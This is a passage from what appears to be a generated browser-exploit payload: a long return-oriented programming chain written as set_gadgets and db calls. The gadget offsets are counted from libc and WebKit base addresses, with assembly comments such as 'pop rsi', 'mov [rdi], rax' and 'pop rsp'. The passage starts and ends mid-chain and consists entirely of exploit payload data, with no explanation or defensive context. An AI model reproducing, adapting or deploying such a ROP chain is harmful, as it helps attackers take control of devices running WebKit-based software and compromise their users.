libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1463:
libc_base+788575, //pop rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+121368, //L1464
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1464:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1466:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+121488, //L1469
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+121472, //L1467
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1467:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121632, //L1472
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+121600, //L1470
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+121616, //L1471
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1470:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1471:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1472:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+121704, //L1473
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1473:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+121760, //L1475
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1475:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+121840, //L1479
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1479:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1477:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1478:
db([32, 0]); // 0x20
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+121944, //L1480
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+121960, //L1481
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1480:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+122048, //L1482
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1482:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122104, //L1484
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1484:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122176, //L1486
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1486:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122232, //L1488
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1488:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122320, //L1490
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1490:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1492:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+122440, //L1495
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+122424, //L1493
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1493:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1495:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122584, //L1498
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+122552, //L1496
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+122568, //L1497
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1496:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1497:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1498:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122656, //L1499
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+122712, //L1501
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1501:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+122792, //L1505
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1505:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1503:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1504:
db([37, 0]); // 0x25
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+122896, //L1506
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+122912, //L1507
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1506:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+123000, //L1508
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1508:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123056, //L1510
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1510:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+123160, //L1512
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1512:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1514:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+123280, //L1517
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+123264, //L1515
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1515:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1517:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123424, //L1520
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+123392, //L1518
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+123408, //L1519
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1518:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1519:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1520:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+123496, //L1521
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+123552, //L1523
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1523:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+123632, //L1527
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1527:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1525:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1526:
db([33, 0]); // 0x21
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+123736, //L1528
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+123752, //L1529
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1528:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+123840, //L1530
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123896, //L1532
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1532:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+123968, //L1534
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1534:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124024, //L1536
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1536:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1538:
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+124160, //L1539
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1539:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1541:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+124280, //L1544
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+124264, //L1542
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1542:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1544:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124424, //L1547
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+124392, //L1545
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+124408, //L1546
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1545:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1546:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1547:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+124496, //L1548
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1548:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+124552, //L1550
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1550:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+124632, //L1554
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1554:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1552:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1553:
db([34, 0]); // 0x22
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+124736, //L1555
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+124752, //L1556
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1555:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+124840, //L1557
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1557:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124896, //L1559
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1559:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+124968, //L1561
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1561:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125024, //L1563
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1563:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1565:
libc_base+811575, //pop rsp
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+125160, //L1566
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1566:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1568:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+125280, //L1571
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+125264, //L1569
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1569:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1571:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125424, //L1574
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+125392, //L1572
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+125408, //L1573
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1572:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1573:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1574:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+125496, //L1575
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1575:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+125552, //L1577
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1577:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+125632, //L1581
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1581:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1579:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1580:
db([35, 0]); // 0x23
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+125736, //L1582
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+125752, //L1583
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1582:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1583:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+125840, //L1584
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1584:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125896, //L1586
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1586:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+125968, //L1588
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1588:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126024, //L1590
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1590:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+126112, //L1592
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1592:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1594:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+126232, //L1597
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126216, //L1595
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1595:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1597:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126376, //L1600
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126344, //L1598
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126360, //L1599
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1598:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1599:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1600:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+126456, //L1601
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1601:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1603:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+126576, //L1606
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126560, //L1604
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1604:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1606:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126720, //L1609
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126688, //L1607
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126704, //L1608
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1607:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1608:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1609:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+126792, //L1610
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1610:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+126848, //L1612
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1612:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126928, //L1616
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1616:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1614:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1615:
db([36, 0]); // 0x24
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+127032, //L1617
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+127048, //L1618
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1617:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1618:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+127136, //L1619
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1619:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127192, //L1621
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1621:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+127264, //L1623
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1623:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127320, //L1625
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1625:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1627:
